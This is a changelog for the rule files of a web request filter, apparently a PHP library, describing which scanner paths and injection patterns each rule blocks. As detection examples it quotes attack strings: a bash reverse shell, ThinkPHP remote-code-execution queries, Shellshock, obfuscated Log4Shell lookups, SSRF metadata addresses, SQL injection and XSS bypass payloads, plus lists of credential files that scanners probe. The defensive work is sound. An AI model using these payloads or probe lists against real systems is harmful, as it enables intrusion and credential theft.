# Changes to the built-in rules

The rule files in this directory are read by every site (`scanners.rules`) or
on request (`wordpress.rules`: `include @wordpress`; `attacks.rules`:
`include @attacks`; `devtools.rules`: `include @devtools`). Each file has a
`version`; each rule a revision (`[SCAN-BACKUP@1]`), raised when the rule
changes what it matches. A site that takes back, replaces or opens a rule and
names the revision it reviewed (`unblock [SCAN-BACKUP@1] at /downloads/**`) is
warned by `bin/request-shield check` and the active rules page when the
revision here is newer — the rule itself applies at once.

## 2026.11.1

`scanners.rules` (built in):

| Rule | Revision | Matches |
|---|---|---|
| `SCAN-SECRETS` | 1 (new) | copies of `.env` -- a name after it: `.env.production`, `.env.local`, `.env-prod`, `.env_1`, in any folder (`SCAN-HIDDEN` has `.env` itself; `.env.bak` was `SCAN-BACKUP`'s already) -- and where tools keep their keys: `.aws`, `.azure`, `.gcloud`, `.ssh`, `.docker`, `.dockerenv`, `.kube`, `.terraform`, `.netrc`, `.pgpass`, `.my.cnf`, `.s3cfg`, `.boto`, `.pypirc`, `.vault-token`, `.git-credentials`, `.gitconfig`, `.envrc`, `.bash_history`, `.cursor`, `.claude`, and the server's `.htaccess` and `.user.ini`, as a file or a folder. `/tools/.envoy`, `/tags/.net`, `/.dockerignore` and `/blog/aws-pricing` pass. With `include @attacks`, `/.aws/…` and `/.ssh/…` were `ATK-EXPLOIT`'s; this rule answers first now, with or without that set. |
| `SCAN-KEYS` | 1 (new) | credential files by their name -- `credentials`, `secrets`, `service-account…`, `client_secret`, `aws-credentials`, `aws-keys`, `private-key`, `privkey` with `.json`, `.yml`, `.yaml`, `.env`, `.pem`, `.key`, `.txt`, `.ini`, `.conf`, `.cfg`, `.properties`, `.toml` or `.xml`; `private.key`, `server.key` -- and key stores by their extension: `.pem`, `.p12`, `.pfx`, `.jks`, `.keystore`, `.ppk`, `.kdbx`, `.tfvars`, `.tfstate`, `.tfstate.backup`; in any folder. `/credentials-guide`, `/blog/secrets.html`, a Keynote file (`/slides/quarter.key`) and a certificate (`/downloads/root-ca.crt`) pass. |

Both from what scanners asked 38 websites for in 30 days: every name in
them was asked for, none is an address of a page.

`devtools.rules` (`include @devtools`), a new set, from the same 30 days --
for sites that serve none of these through PHP:

| Rule | Revision | Matches |
|---|---|---|
| `DEV-BUILD` | 1 (new) | build files in any folder: `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `Dockerfile`, `Makefile`, `Gemfile`, `Gemfile.lock`, `requirements.txt`, `go.mod`, `go.sum`, `Cargo.toml`, `Cargo.lock`, `phpunit.xml`, `phpunit.xml.dist`, `tsconfig.json`, `webpack.config.js` (also `vite`, `next`, `nuxt`; `.js`, `.cjs`, `.mjs`, `.ts`). `/manifest.json`, `/package-tours` and `/blog/dockerfile-tips` pass. |
| `DEV-APPCONFIG` | 1 (new) | other software's settings files in any folder: `php.ini`, `appsettings.json` (also `appsettings.Production.json`), `application.yml`, `application.properties` (also `application-prod.yml`), `database.yml`, `parameters.yml`, `settings.local.yml`, `settings.py`, `local_settings.py`. `/settings` and `/docs/application.html` pass. |
| `DEV-DEBUG` | 1 (new) | debug and status pages, at the root only: `/_profiler`, `/_wdt`, `/telescope`, `/horizon`, `/_ignition`, `/_debugbar`, `/debug/vars`, `/debug/pprof`, `/debug/default`, `/actuator`, `/jolokia`, `/h2-console`, `/server-status`, `/server-info`, `/elmah.axd`, `/trace.axd`, `/jmx-console`, `/web-console`, `/manager/html`, and what is below them. `/shop/telescope`, `/horizon-2030` and `/actuators-and-valves` pass. (`/_ignition/execute-solution` is `ATK-EXPLOIT`'s too.) |
| `DEV-APIDOCS` | 1 (new) | API consoles and descriptions, at the root only: `/swagger`, `/swagger-ui`, `/swagger-ui.html`, `/swagger.json`, `/swagger.yaml`, `/openapi.json`, `/openapi.yaml`, `/api-docs`, `/v1/api-docs` to `/v3/api-docs`, `/graphiql`. `/api-documentation` and `/docs/openapi.json` pass. |
| `DEV-SOURCE` | 1 (new) | source maps (`.js.map`, `.css.map`) and a development server's own addresses: `/@fs/…`, `/@vite/…`, `/@id/…`, `/@react-refresh`, `/__vite_ping`, `/__webpack_hmr`, `/sockjs-node`, `/webpack-dev-server`. `/sitemap`, `/maps/berlin.map.html` and `/@alice` pass. |

## 2026.10.2

`scanners.rules` (built in):

| Rule | Revision | Matches |
|---|---|---|
| `SCAN-CONFIG` | 1 (new) | project and key files: `composer.json`, `composer.lock`, `web.config`, `docker-compose.yml` / `.yaml`, `.npmrc`, `id_rsa`, `id_dsa`, `id_ecdsa`, `id_ed25519` (and `.pub`), in any folder. `/composer-guide` passes. |

`attacks.rules` (`include @attacks`):

| Rule | Revision | Matches |
|---|---|---|
| `ATK-SQL-FUNC` | 1 (new) | SQL injection through the database's own functions: `extractvalue(`, `updatexml(`, `load_file(`, `into outfile '…'` / `into dumpfile '…'`, `@@version` and other server variables (also `@@global.…`, `@@session.…`), `xp_cmdshell`. The words alone ("load file into outfile tutorial") pass. |
| `ATK-SQL-BOOL` | 1 (new) | SQL injection without quotes: `or 1=1`, `and 6522=6522` (sqlmap's boolean test), also `1/**/or/**/1=1`. "rock and roll 2=2" and "a or 1=2" pass; "and 2024=2024" does not. |
| `ATK-PHP` | 2 | also ThinkPHP's way into its own code: `think\` (no letter before it) and one of the classes its exploits name -- `app`, `container`, `request`, `template`, `view`, `module`, `config` -- in the query (`?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system`, `index/think\Container/…`, `\think\request/input&filter=system`, `\think\template\driver\file/write`, `think\config/get&name=database.password`; CVE-2018-20062 and the like, scanned for on every site). `App\Think\Foo`, `rethink\db`, JSON text with `think\n`, a Windows path and the word "invokefunction" pass -- as long as none of those classes follows `think\` (`C:\think\config\app.php`, `App\Think\Request` are refused); the PATH_INFO form in the path is not read. |
| `ATK-SHELL` | 2 | also a reverse shell's `/dev/tcp/<host>/<port>` or `/dev/udp/…` -- `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1`, `exec 5<>/dev/tcp/…/80` -- which revision 1 let pass without a `;` or `|` before it. The device named alone (`bash /dev/tcp tutorial`) passes. |
| `ATK-UA-TOOLS` | 2 | also `feroxbuster`, `arachni`, `whatweb`, `w3af` by their default User-Agent -- and ffuf by the one it sends, "Fuzz Faster U Fool v2…" (revision 1 looked for "ffuf", which ffuf does not send); `dirsearch`, `wafw00f` and `sqlninja` when they send their name (by default dirsearch and wafw00f send a browser's). A name inside a longer word (`nmapper`, `ffuffy`, `my_nmap`) passes. |
| `ATK-XSS-EVENT` | 2 | also after a quoted value that holds a `>` -- `<img title=">" src=x onerror=alert(1)>`: a browser does not end the tag there; revision 1 stopped at it. Everything revision 1 refused stays refused (the first of its two expressions reads as revision 1 did); both stop at the next `<`, so a query full of tags costs about what a plain one does, with PCRE's JIT or without. Not caught: a quoted value with `<` and `>` (`title="<>"`), a quote in a name or in an unquoted value next to a quoted `>` (`x=a" title=">"`); the same for `ATK-XSS-ATTR`. |
| `ATK-XSS-ATTR` | 1 (new) | cross-site scripting through attributes that need no `on…` event: `formaction=` (a button or input that sends the form elsewhere), `xlink:href=` (SVG's link) -- inside a tag only: `<` and a letter, up to its `>` (also past an `&`: `<button x=& formaction=…>` decodes so; and past a quoted `>`: `title=">"`). The words alone and `x < y formaction=1` pass. (`srcdoc` exists on `<iframe>` only, which `ATK-XSS-TAG` refuses.) |
| `ATK-SHELLSHOCK` | 1 (new) | Shellshock in any header but the cookies: a value that starts with `() {` (also `(){`), the Content-Type too -- `() { :; }; id`, `(){ :;};`, `() { _; } >_[…]` (CVE-2014-6278), `() { (a)=>\` (CVE-2014-7169), also percent-encoded -- the form bash runs in a CGI script (bash itself needs `() {` exactly; the variants are refused too, their intent is plain). `() {` inside a value passes (a search for `var f = function () { return x };`). |
| `ATK-SSRF-META` | 1 (new) | a cloud's metadata address in the query (SSRF): `169.254.169.254`, `169.254.170.2`, `100.100.100.200`, `metadata.google.internal`, `fd00:ec2::254` (also written out), `ffff:a9fe:a9fe` (the mapped IPv6 form), and after `//` or `@` as `2852039166`, `0xa9fea9fe`, `0xa9.0xfe.0xa9.0xfe`, `0251.0376.0251.0376` and AWS's `instance-data`. Other link-local addresses and a bare number pass. |
| `ATK-PHP-OBJ` | 1 (new) | a serialised PHP object in the query: `O:8:"stdClass":0:{`, `O:+8:…` (sent as `%2B`), a sign or leading zeros on the count of properties (`:+0:{`), `C:…`, also inside an array -- the way into `unserialize()` gadget chains. A serialised array without an object passes. |
| `ATK-SSTI` | 1 (new) | template injection in the query: `{{` … `*`, `__`, `(` or `_self` … `}}` -- `{{7*7}}`, `{{_self.env…}}` (Twig), `{{''.__class__}}` (Jinja). A plain placeholder (`{{ user.name }}`) passes. |
| `ATK-JNDI` | 2 | also a lookup inside a lookup -- `${${lower:j}ndi:…}`, `${${upper:j}${upper:n}di:…}` -- and the lookups `lower:`, `upper:`, `ctx:`, `main:`, `spring:`; revision 1 let the nested ones through. Two placeholders side by side (`${amount} of ${count}`) still pass. |

The attack rules also see the body of MySQL's versioned comments
(`/*!50000UNION*/`): the value they are matched against changed, no rule did.

## 2026.10.1

No rule changed what it matches (no revision raised). `scanners.rules` and
`wordpress.rules` carry examples next to their rules (`expect` lines,
[proposal 0029](../docs/proposals/0029-rule-examples.md)): what each rule
refuses, and near misses it must let through. `bin/request-shield test`
decides them, together with a site's own examples.

## 2026.09.1

First version as rule files, with the patterns the library had since 0.1.0.

| Rule | Revision | Matches |
|---|---|---|
| `SCAN-HIDDEN` | 1 | hidden files and folders: `.git`, `.svn`, `.hg`, `.bzr`, `.env`, `.htpasswd`, `.DS_Store`, `.idea`, `.vscode` |
| `SCAN-BACKUP` | 1 | `.bak`, `.old`, `.orig`, `.save`, `.swp`, `.sql`, `.sql.gz`, `.tar`, `.tar.gz`, `.tgz`, `.zip`, `.7z`, `.rar`, `.log` |
| `SCAN-TEST` | 1 | `phpinfo.php`, `php_info.php`, `info.php`, `test.php` |
| `SCAN-DBTOOL` | 1 | `vendor/phpunit`, `phpmyadmin`, `pma`, `adminer` |
| `SCAN-CGI` | 1 | `cgi-bin`, `.well-known/` except `acme-challenge`, `security.txt`, `change-password` |
| `WP-FOLDERS` | 1 | `/wp-admin`, `/wp-includes`, `/wp-content` |
| `WP-SCRIPTS` | 1 | `/wp-login.php`, `/xmlrpc.php`, `/wp-config.php` |
| `ATK-SQL-UNION`, `ATK-SQL-TIME`, `ATK-SQL-TAUT`, `ATK-SQL-SCHEMA`, `ATK-SQL-STACK` | 1 | SQL injection in the query: `UNION SELECT`, `sleep()`, tautologies, `information_schema`, `; DROP TABLE` |
| `ATK-XSS-TAG`, `ATK-XSS-EVENT`, `ATK-XSS-URL` | 1 | cross-site scripting in the query: `<script>` and its siblings, `on*=` handlers, `javascript:` and `data:text/html` addresses |
| `ATK-PHP`, `ATK-SHELL` | 1 | code and shell injection in the query: `<?php`, `eval()`, `shell_exec()`, `; cat /`, `$(id)`, `/bin/sh` |
| `ATK-LFI`, `ATK-WRAPPER` | 1 | file inclusion in the query: `../../`, `/etc/passwd`, `php://` and the other wrappers |
| `ATK-JNDI` | 1 | Log4Shell and template injection (`${jndi:…}`, `${env:…}`), anywhere in the request |
| `ATK-UA-TOOLS` | 1 | attack tools by their User-Agent: sqlmap, nikto, nmap, wpscan, nuclei … |
| `ATK-EXPLOIT` | 1 | paths of well-known exploits: `eval-stdin.php`, `/hnap1`, `/boaform`, `/.aws`, `/.ssh` |
